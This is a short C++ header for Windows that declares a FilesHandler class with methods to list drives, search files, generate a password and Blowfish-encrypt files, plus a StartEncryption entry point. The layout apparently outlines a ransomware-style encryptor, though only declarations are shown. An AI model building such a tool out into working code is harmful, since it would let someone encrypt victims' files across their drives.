#pragma once
#include <vector>
#include <string>
#include <Windows.h>
#include <fstream>
#include <ios>
#include<iostream>
#include <shlobj.h>
#include "blowfish.h"
#include <ctime>
#include <random>
#include <thread>
#include <stdio.h>
#include <stdlib.h>



class FilesHandler
{
private:
	
	void updateDriveList();
	void SearchFile(LPWSTR path);
	std::string GeneratePassword();
	void Encrypt(std::string _filePath, std::string _password);
public:
	bool StartEncryption();

};

